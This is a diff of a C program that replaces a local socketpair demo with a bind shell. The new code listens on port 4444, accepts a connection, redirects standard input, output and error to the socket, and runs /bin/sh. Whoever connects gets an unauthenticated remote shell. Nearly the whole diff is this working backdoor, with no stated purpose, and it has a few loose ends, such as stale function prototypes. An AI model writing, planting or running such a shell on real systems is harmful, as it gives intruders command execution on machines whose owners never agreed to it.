@@ -1,48 +1,35 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
+#include <netinet/in.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
-#include <netinet/in.h>
 
-#define PARENT  0
-#define CHILD   1
+#define R   0
+#define W   1
 
 #define die(msg) \
         do { perror(msg); exit(1); } while (0)
 
 int handle_parent(int sockfd);
-int handle_child(char *cmd);
+int handle_child(int connfd);
 int create_listener(int port);
 
-int socks[2];
 
 int main(void)
 {
-        pid_t pid;
+        int sockfd;
+        int connfd;
 
-        if (socketpair(AF_LOCAL, SOCK_STREAM, 0, socks) == -1) {
-                perror("socketpair");
-                exit(1);
+        sockfd = create_listener(4444);
+        connfd = accept(sockfd, NULL, NULL); 
+        if (-1 == connfd) {
+                die("accept");
         }
 
-        pid = fork();
-        if (-1 == pid) {
-                // Failure
-                die("fork");
-        }
-
-        if (0 == pid) {
-                // Child process
-                close(socks[PARENT]);
-                handle_child("sh");
-        } else {
-                // Parent process
-                close(socks[CHILD]);
-                handle_parent(socks[PARENT]);
-        }
+        connect_to_shell(connfd);
 
         return 0;
 }
@@ -78,37 +65,15 @@ int create_listener(int port)
         return sockfd;
 }
 
-int handle_parent(int sockfd)
+int connect_to_shell(int connfd)
 {
-        char buf[4096];
-        ssize_t n_read;
-
-        do {
-                n_read = read(sockfd, buf, sizeof(buf));
-                if (-1 == n_read) {
-                        perror("read");
-                        return 1;
-                }
-
-                puts(buf);
-                memset(buf, 0, n_read);
-        } while (n_read > 0);
-
-        if (-1 == n_read) {
-                perror("read");
-                exit(1);
+        dup2(connfd, 0);
+        dup2(connfd, 1);
+        dup2(connfd, 2);
+        char* const args[] = {"/bin/sh", NULL};
+        if (-1 == execv("/bin/sh", args)) {
+                die("execv");
         }
-
-        wait(NULL);
-
-        return 0;
-}
-
-int handle_child(char *cmd)
-{
-        dup2(socks[CHILD], STDOUT_FILENO);
-        char* const args[] = {"/bin/sh", "-c", cmd, NULL };
-        execv("/bin/sh", args);
 
         return 0;
 }
